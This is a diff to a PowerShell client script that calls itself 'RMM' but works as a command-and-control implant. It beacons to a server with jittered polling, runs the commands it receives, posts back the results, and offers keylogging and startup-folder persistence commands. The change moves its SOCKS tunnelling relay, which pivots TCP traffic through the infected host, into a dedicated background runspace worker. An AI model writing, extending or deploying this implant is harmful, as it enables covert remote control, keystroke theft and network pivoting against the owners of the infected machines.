@@ -85,8 +85,12 @@ $script:RmmEverRegistered = $false
 $script:RmmVerbose = [bool]$verboseHttp
 $script:UsePersistentHttp = [bool]$persistentHttp
 $script:RmmShellCwd = (Get-Location).Path
-$script:RmmSocksEnabled = $false
-$script:RmmSocksConnections = @{}
+$script:RmmSocksWorker = @{
+    Running   = $false
+    Runspace  = $null
+    PowerShell = $null
+    Async     = $null
+}
 
 if ($script:UsePersistentHttp) {
     $script:RmmCookieContainer = New-Object System.Net.CookieContainer
@@ -562,27 +566,21 @@ function Parse-CmdResponse {
         elseif ($p.Name -match '^(?i)type$') { $typ = [string]$p.Value }
     }
     if ($null -eq $cmd) { $cmd = '' }
-    $socks = $false
-    foreach ($p in $response.PSObject.Properties) {
-        if ($p.Name -match '^(?i)socks_active$') {
-            $socks = [bool]$p.Value
-        }
-    }
     if ($null -eq $typ) {
         $typ = if ([string]::IsNullOrWhiteSpace($cmd)) { 'none' } else { 'execute' }
     }
-    return @{ command = $cmd; type = $typ; socks_active = $socks }
+    return @{ command = $cmd; type = $typ }
 }
 
-function Get-RmmCmdSocksActive {
-    param($CmdData)
-    if ($null -eq $CmdData) { return $false }
-    if ($CmdData -is [hashtable]) {
-        if ($CmdData.ContainsKey('socks_active')) { return [bool]$CmdData['socks_active'] }
-        return [bool]$CmdData.socks_active
+function Get-RmmSocksPollActive {
+    param($Poll)
+    if ($null -eq $Poll) { return $false }
+    $obj = $Poll
+    if ($obj -is [string]) {
+        try { $obj = $obj | ConvertFrom-Json } catch { return $false }
     }
-    foreach ($p in $CmdData.PSObject.Properties) {
-        if ($p.Name -match '^(?i)socks_active$') { return [bool]$p.Value }
+    foreach ($p in $obj.PSObject.Properties) {
+        if ($p.Name -match '^(?i)active$') { return [bool]$p.Value }
     }
     return $false
 }
@@ -611,8 +609,6 @@ function Test-RmmInternalCommand {
     if ($c -match '^(?i)__KEYLOG__\s') { return $true }
     if ($c -match '^(?i)__INSTALL_PERSIST__$') { return $true }
     if ($c -match '^(?i)__REMOVE_PERSIST__$') { return $true }
-    if ($c -match '^(?i)__SOCKS_START__$') { return $true }
-    if ($c -match '^(?i)__SOCKS_STOP__$') { return $true }
     return $false
 }
 
@@ -627,24 +623,6 @@ function Send-RmmTextResult {
     $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
     $json = $payload | ConvertTo-Json -Compress -Depth 10
     Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
-}
-
-function Complete-RmmBeaconTurn {
-    param([hashtable]$Headers)
-    if ($script:RmmSocksEnabled) {
-        Invoke-RmmSocksPollBurst -Headers $Headers
-    }
-}
-
-function Stop-RmmSocksRelay {
-    foreach ($id in @($script:RmmSocksConnections.Keys)) {
-        $tcp = $script:RmmSocksConnections[$id]
-        if ($tcp) {
-            try { $tcp.Close() } catch { }
-        }
-        $script:RmmSocksConnections.Remove($id) | Out-Null
-    }
-    $script:RmmSocksEnabled = $false
 }
 
 function Read-RmmSocksTcpChunk {
@@ -675,19 +653,19 @@ function Read-RmmSocksTcpChunk {
 }
 
 function Invoke-RmmSocksCycle {
-    param([hashtable]$Headers)
-    if (-not $script:RmmSocksEnabled) { return $false }
-    $pollUrl = "$u/socks?id=$sessionId"
-    $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
-    if ($null -eq $poll) {
-        Write-RmmLog "SOCKS GET $pollUrl failed (check beacon token and server version)" -Level WARN
-        return $false
+    param(
+        [hashtable]$Headers,
+        $Poll = $null
+    )
+    if ($null -eq $Poll) {
+        $pollUrl = "$u/socks?id=$sessionId"
+        $Poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
+        if ($null -eq $Poll) {
+            Write-RmmLog "SOCKS GET $pollUrl failed (check beacon token and server version)" -Level WARN
+            return $false
+        }
     }
-    $tasks = Get-RmmSocksTasksFromPoll -Poll $poll
-    if ($tasks.Count -gt 0 -and -not $script:RmmSocksEnabled) {
-        $script:RmmSocksEnabled = $true
-        Write-Host "[+] SOCKS relay active (tasks from server)" -ForegroundColor Green
-    }
+    $tasks = Get-RmmSocksTasksFromPoll -Poll $Poll
     $responses = New-Object System.Collections.ArrayList
     foreach ($task in $tasks) {
         $op = [string]$task.op
@@ -779,19 +757,131 @@ function Invoke-RmmSocksCycle {
     return $true
 }
 
-function Invoke-RmmSocksPollBurst {
-    param(
-        [hashtable]$Headers,
-        [int]$Rounds = 20,
-        [int]$DelayMs = 100
+function New-RmmSocksRunspace {
+    $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+    $fnNames = @(
+        'Write-RmmLog',
+        'Get-RmmHttpStatusHint',
+        'Get-RmmHttpErrorBody',
+        'Convert-RmmHttpResponseContent',
+        'Resolve-RmmTunnelIpv4',
+        'Invoke-RmmRestMethod',
+        'Get-RmmRequestHeaders',
+        'Get-RmmSocksPollActive',
+        'Get-RmmSocksTasksFromPoll',
+        'Read-RmmSocksTcpChunk',
+        'Invoke-RmmSocksCycle'
     )
-    if (-not $script:RmmSocksEnabled) { return }
-    for ($i = 0; $i -lt $Rounds; $i++) {
-        $null = Invoke-RmmSocksCycle -Headers $Headers
-        if ($i -lt ($Rounds - 1)) {
-            Start-Sleep -Milliseconds $DelayMs
-        }
+    foreach ($name in $fnNames) {
+        $cmd = Get-Command -Name $name -CommandType Function -ErrorAction Stop
+        $entry = [System.Management.Automation.Runspaces.SessionStateFunctionEntry]::new(
+            $name, $cmd.ScriptBlock)
+        [void]$iss.Functions.Add($entry)
     }
+    return [runspacefactory]::CreateRunspace($iss)
+}
+
+function Set-RmmSocksRunspaceVariables {
+    param(
+        [System.Management.Automation.Runspaces.Runspace]$Runspace,
+        [hashtable]$Vars
+    )
+    foreach ($key in $Vars.Keys) {
+        $Runspace.SessionStateProxy.SetVariable($key, $Vars[$key])
+    }
+}
+
+function Start-RmmSocksChannelWorker {
+    if ($script:RmmSocksWorker.Running) { return }
+
+    $socksRs = New-RmmSocksRunspace
+    $socksRs.Open()
+
+    $socksCookie = New-Object System.Net.CookieContainer
+    Set-RmmSocksRunspaceVariables -Runspace $socksRs -Vars @{
+        u                              = $u
+        sessionId                      = $sessionId
+        beaconSecret                   = $beaconSecret
+        httpProxy                      = $httpProxy
+        httpProxyUseDefaultCredentials = $httpProxyUseDefaultCredentials
+        RmmSocksChannelStop            = $false
+    }
+
+    $workerScript = @'
+while (-not $RmmSocksChannelStop) {
+    try {
+        $headers = Get-RmmRequestHeaders
+        $pollUrl = "$u/socks?id=$sessionId"
+        $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $headers -RestErrorAction SilentlyContinue
+        $active = Get-RmmSocksPollActive -Poll $poll
+        $tasks = Get-RmmSocksTasksFromPoll -Poll $poll
+        if ($tasks.Count -gt 0) { $active = $true }
+        if ($active) {
+            if (-not $script:RmmSocksChannelWasActive) {
+                Write-Host "[+] SOCKS dedicated channel active (/socks only)" -ForegroundColor Green
+                $script:RmmSocksChannelWasActive = $true
+            }
+            $null = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
+            Start-Sleep -Milliseconds 80
+        } else {
+            if ($script:RmmSocksChannelWasActive) {
+                Write-Host "[*] SOCKS channel idle (server relay stopped)" -ForegroundColor DarkGray
+                $script:RmmSocksChannelWasActive = $false
+            }
+            foreach ($id in @($script:RmmSocksConnections.Keys)) {
+                try { $script:RmmSocksConnections[$id].Close() } catch { }
+                $script:RmmSocksConnections.Remove($id) | Out-Null
+            }
+            Start-Sleep -Milliseconds 1200
+        }
+    } catch {
+        Start-Sleep -Milliseconds 400
+    }
+}
+foreach ($id in @($script:RmmSocksConnections.Keys)) {
+    try { $script:RmmSocksConnections[$id].Close() } catch { }
+}
+Write-Host "[*] SOCKS channel worker stopped" -ForegroundColor Yellow
+'@
+
+    $ps = [PowerShell]::Create()
+    $ps.Runspace = $socksRs
+    [void]$ps.AddScript({
+        param($Verbose, $Cookie, $Proxy)
+        $script:RmmVerbose = [bool]$Verbose
+        $script:UsePersistentHttp = $true
+        $script:RmmCookieContainer = $Cookie
+        $script:RmmWebProxy = $Proxy
+        $script:RmmSocksConnections = @{}
+        $script:RmmSocksChannelWasActive = $false
+    }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy)
+    $ps.Invoke() | Out-Null
+    [void]$ps.AddScript($workerScript)
+    $async = $ps.BeginInvoke()
+
+    $script:RmmSocksWorker.Running = $true
+    $script:RmmSocksWorker.Runspace = $socksRs
+    $script:RmmSocksWorker.PowerShell = $ps
+    $script:RmmSocksWorker.Async = $async
+    Write-Host "[*] SOCKS channel worker started (separate from beacon /cmd)" -ForegroundColor Cyan
+}
+
+function Stop-RmmSocksChannelWorker {
+    if (-not $script:RmmSocksWorker.Running) { return }
+    $rs = $script:RmmSocksWorker.Runspace
+    $ps = $script:RmmSocksWorker.PowerShell
+    if ($rs) {
+        try { $rs.SessionStateProxy.SetVariable('RmmSocksChannelStop', $true) } catch { }
+    }
+    if ($ps -and $script:RmmSocksWorker.Async) {
+        try { $ps.EndInvoke($script:RmmSocksWorker.Async) } catch { }
+    }
+    if ($ps) { $ps.Dispose() }
+    if ($rs) { $rs.Close() }
+    $script:RmmSocksWorker.Running = $false
+    $script:RmmSocksWorker.Runspace = $null
+    $script:RmmSocksWorker.PowerShell = $null
+    $script:RmmSocksWorker.Async = $null
 }
 
 # 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
@@ -1044,24 +1134,15 @@ while (-not $registered) {
     }
 }
 
-# Main loop
+Start-RmmSocksChannelWorker
+
+# Main loop — beacon only (/register, /cmd, /result); SOCKS uses dedicated /socks channel
 while ($true) {
     try {
-        # Add jitter before each poll cycle (shorter interval while SOCKS relay is active)
-        if ($script:RmmSocksEnabled) {
-            $socksBase = 1
-            $socksJitter = 5
-            $null = Get-JitteredSleep -baseSeconds $socksBase -jitterPercent $socksJitter
-        } else {
-            $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
-        }
+        $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
 
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
-
-        if ($script:RmmSocksEnabled) {
-            Invoke-RmmSocksPollBurst -Headers $headers -Rounds 4 -DelayMs 100
-        }
         
         # Poll /cmd before register so a killed session gets __EXIT__ (register returns 403 TERMINATED).
         $cmdUrl = "$u/cmd?id=$sessionId"
@@ -1074,20 +1155,9 @@ while ($true) {
         $cmdData = Parse-CmdResponse -response $response
         $command = ([string]$cmdData.command).Trim()
         $cmdType = [string]$cmdData.type
-        $socksActive = Get-RmmCmdSocksActive -CmdData $cmdData
-
-        if ($socksActive) {
-            if (-not $script:RmmSocksEnabled) {
-                $script:RmmSocksEnabled = $true
-                Write-Host "[+] SOCKS relay active (signaled by server)" -ForegroundColor Green
-                Invoke-RmmSocksPollBurst -Headers $headers -Rounds 8 -DelayMs 100
-            }
-        } elseif ($script:RmmSocksEnabled) {
-            Stop-RmmSocksRelay
-            Write-Host "[*] SOCKS relay stopped (signaled by server)" -ForegroundColor Yellow
-        }
 
         if ($command -eq "__EXIT__") {
+            Stop-RmmSocksChannelWorker
             Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
             exit 0
         }
@@ -1098,7 +1168,6 @@ while ($true) {
         if ($command -and $command -ne "") {
             if ($command -like "__CONFIG__ *") {
                 $null = Update-Configuration -configString $command
-                Complete-RmmBeaconTurn -Headers $headers
                 continue
             }
             Write-Host "[>] Received command: $command" -ForegroundColor Cyan
@@ -1106,7 +1175,6 @@ while ($true) {
             # Handle special commands FIRST before anything else
             if ($command -eq "__STOP__") {
                 Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
-                Complete-RmmBeaconTurn -Headers $headers
                 continue
             }
             elseif ($command -like "__DOWNLOAD__ *") {
@@ -1280,14 +1348,6 @@ while ($true) {
                 Write-Host "[+] Persistence installed" -ForegroundColor Green
                 }
             }
-            elseif ($command -match '^(?i)__SOCKS_START__$') {
-                $script:RmmSocksEnabled = $true
-                Write-Host "[+] SOCKS relay enabled (fast beacon + /socks polls)" -ForegroundColor Green
-            }
-            elseif ($command -match '^(?i)__SOCKS_STOP__$') {
-                Stop-RmmSocksRelay
-                Write-Host "[*] SOCKS relay stopped on agent" -ForegroundColor Yellow
-            }
             elseif ($command -eq "__REMOVE_PERSIST__") {
                 # Remove persistence
                 $startupDir = [Environment]::GetFolderPath('Startup')
@@ -1322,8 +1382,6 @@ while ($true) {
                 Write-Host "[+] Result sent to RMM" -ForegroundColor Green
             }
         }
-
-        Complete-RmmBeaconTurn -Headers $headers
         
     } catch {
         if (Test-RmmSessionTerminated -ErrorRecord $_) {
